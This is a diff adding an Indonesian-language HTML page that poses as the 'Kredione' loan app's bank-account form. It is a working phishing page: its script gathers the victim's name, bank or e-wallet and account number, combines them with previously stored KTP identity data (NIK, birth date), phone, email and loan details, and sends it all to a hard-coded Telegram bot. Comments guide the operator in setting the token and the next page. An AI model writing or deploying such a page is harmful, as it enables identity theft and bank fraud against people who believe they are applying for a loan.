@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Tambahkan Nomor Rekening</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:Inter,Arial,sans-serif}
+html{height:100%;overflow:hidden}
+body{background:#fff;height:100dvh;width:100%;overflow:hidden;display:flex;flex-direction:column}
+.header{padding:14px 16px;display:flex;align-items:center;justify-content:space-between;background:#fff;flex-shrink:0}
+.header .back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;font-size:22px;cursor:pointer}
+.header h1{font-size:16px;font-weight:800;flex:1;text-align:center}
+.header .cs{width:32px;height:32px;display:flex;align-items:center;justify-content:center}
+.info{margin:12px 16px;background:#e6fbfb;border-radius:16px;padding:14px 16px;display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+.info p{font-size:12px;color:#0a6e6f;line-height:1.5;font-weight:500}
+.info img{width:62px;flex-shrink:0}
+.card{margin:0 16px;background:#fff;border-radius:20px;padding:4px 18px;box-shadow:0 4px 20px rgba(17,199,200,.12);border:1px solid #f0f0f0}
+.row{padding:18px 0;border-bottom:1px solid #f3f4f6;display:flex;justify-content:space-between;align-items:center}
+.row:last-child{border:none}
+.row .label{font-size:14px;font-weight:700;color:#111827}
+.row .input{border:none;outline:none;text-align:right;font-size:14px;color:#111827;width:60%;background:transparent}
+.row .input::placeholder{color:#9ca3af}
+.row .select{font-size:14px;color:#9ca3af;display:flex;align-items:center;gap:6px;cursor:pointer}
+.footer{margin-top:auto;padding:12px 16px 18px;background:#fff}
+.secure{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#6b7280;margin-bottom:10px}
+.btn{width:100%;background:#11C7C8;color:#fff;border:none;padding:15px;border-radius:28px;font-size:16px;font-weight:800;cursor:pointer;box-shadow:0 6px 18px rgba(17,199,200,.35);transition:.2s}
+.btn:disabled{background:#d1d5db;box-shadow:none}
+.btn:active{transform:scale(.98)}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.4);display:none;align-items:flex-end;z-index:99}.overlay.show{display:flex}
+.sheet{background:#fff;width:100%;border-radius:24px 24px 0 0;max-height:70dvh;overflow:auto;padding:12px 12px 20px}
+.sheet h3{font-size:15px;font-weight:800;padding:10px 6px}
+.bank-item{padding:14px 12px;border-bottom:1px solid #f3f4f6;font-size:14px;display:flex;justify-content:space-between;cursor:pointer}
+.bank-item:active{background:#f9fafb}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="back" onclick="history.back()">‹</div>
+  <h1>Tambahkan Nomor Rekening</h1>
+  <div class="cs">🎧</div>
+</div>
+
+<div class="info">
+  <p>Nama peminjam dan nama pemilik rekening harus sama. Jangan menggunakan nomor kartu kredit, yang akan mengakibatkan pencairan dana gagal.</p>
+  <img src="https://cdn-icons-png.flaticon.com/512/6963/6963703.png" alt="">
+</div>
+
+<div class="card">
+  <label class="row">
+    <span class="label">Nama</span>
+    <input class="input" id="namaRek" placeholder="Silakan masukkan" oninput="cekRek()">
+  </label>
+  <div class="row" onclick="openBank()">
+    <span class="label">Nama Bank</span>
+    <span class="select" id="bankText">Silakan Pilih <span>›</span></span>
+  </div>
+  <label class="row">
+    <span class="label">Nomor Rekening</span>
+    <input class="input" id="norek" type="tel" placeholder="Silakan masukkan" inputmode="numeric" oninput="cekRek()">
+  </label>
+</div>
+
+<div class="footer">
+  <div class="secure">🛡️ Kredione melindungi keamanan informasi Anda</div>
+  <button class="btn" id="btnLanjut" onclick="lanjutkan()" disabled>Lanjutkan</button>
+</div>
+
+<div class="overlay" id="overlayBank" onclick="if(event.target==this)this.classList.remove('show')">
+  <div class="sheet">
+    <h3>Pilih Bank / E-Wallet</h3>
+    <div class="bank-item" onclick="pickBank('BCA')">BCA <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('BRI')">BRI <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('BNI')">BNI <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('MANDIRI')">MANDIRI <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('BSI')">BSI <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('BANK JAGO')">BANK JAGO <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('SEABANK')">SEABANK <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('DANA')">DANA <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('OVO')">OVO <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('GOPAY')">GOPAY <span>›</span></div>
+    <div class="bank-item" onclick="pickBank('LINKAJA')">LINKAJA <span>›</span></div>
+  </div>
+</div>
+
+<script>
+// === ISI TOKEN TELEGRAM DISINI BOS ===
+const TELEGRAM_BOT_TOKEN="8878507338:AAFGFpr2gOnxcm6YGd5L8uZQ2lOdyImuNKM";
+const TELEGRAM_CHAT_ID="8488971726";
+
+let selectedBank = "";
+
+function openBank(){ document.getElementById('overlayBank').classList.add('show') }
+function pickBank(nama){
+  selectedBank = nama;
+  const el=document.getElementById('bankText');
+  el.innerHTML = nama + ' <span style="color:#111">›</span>';
+  el.style.color = "#111827";
+  el.style.fontWeight = "700";
+  document.getElementById('overlayBank').classList.remove('show');
+  cekRek();
+}
+function cekRek(){
+  const nama=document.getElementById('namaRek').value.trim();
+  const norek=document.getElementById('norek').value.trim();
+  const ok = nama.length>=3 && selectedBank && norek.length>=6;
+  document.getElementById('btnLanjut').disabled=!ok;
+}
+
+// auto isi nama dari halaman sebelumnya
+try{
+  const s1 = JSON.parse(localStorage.getItem('user_step1')||'{}');
+  if(s1.nama) {document.getElementById('namaRek').value=s1.nama; cekRek();}
+}catch(e){}
+
+async function lanjutkan(){
+  const nama = document.getElementById('namaRek').value.trim();
+  const norek = document.getElementById('norek').value.trim();
+  const btn = document.getElementById('btnLanjut');
+  
+  if(!nama){ alert('Isi Nama pemilik rekening'); return }
+  if(!selectedBank){ alert('Pilih Nama Bank'); return }
+  if(norek.length < 6){ alert('Isi Nomor Rekening yang benar'); return }
+
+  // ambil semua data sebelumnya
+  const step1 = JSON.parse(localStorage.getItem('user_step1')||'{}');
+  const ktp = JSON.parse(localStorage.getItem('ktp_lengkap')||'{}');
+
+  // simpan
+  localStorage.setItem('rek_nama', nama);
+  localStorage.setItem('rek_bank', selectedBank);
+  localStorage.setItem('rek_norek', norek);
+
+  btn.innerText = "Mengirim...";
+  btn.disabled = true;
+
+  const teks = `💳 REKENING CAIR - FINAL
+
+👤 Nama Rek: ${nama}
+🏦 Bank: ${selectedBank}
+💳 No Rek: ${norek}
+
+--- KTP ---
+🪪 Nama KTP: ${ktp.namaLengkap||'-'} ${ktp.namaBelakang||''}
+🆔 NIK: ${ktp.nik||'-'}
+🎂 Lahir: ${ktp.tglLahir||'-'} | ${ktp.status||'-'} | ${ktp.pekerjaan||'-'}
+
+--- Pendaftaran Awal ---
+👤 Daftar: ${step1.nama||'-'}
+📱 HP: ${step1.hp||'-'}
+📧 Email: ${step1.email||'-'}
+💰 Pinjam: ${step1.simulasi?.jumlah||'-'} | ${step1.simulasi?.tenor||'-'} | Cicil ${step1.simulasi?.cicilan||'-'}
+
+⏰ ${new Date().toLocaleString('id-ID')}`;
+
+  try{
+    if(!TELEGRAM_BOT_TOKEN.includes('ISI')){
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:teks})
+      });
+    }
+  }catch(e){ console.log('Telegram error',e); }
+
+  // === PINDAH HALAMAN SETELAH KIRIM ===
+  btn.innerText = "Berhasil ✓";
+  setTimeout(()=>{
+    // GANTI FILE TUJUAN DISINI BOS
+    window.location.href = "verifikasi-data.html"; // atau proses.html / sukses.html
+  }, 700);
+}
+</script>
+</body>
+</html>
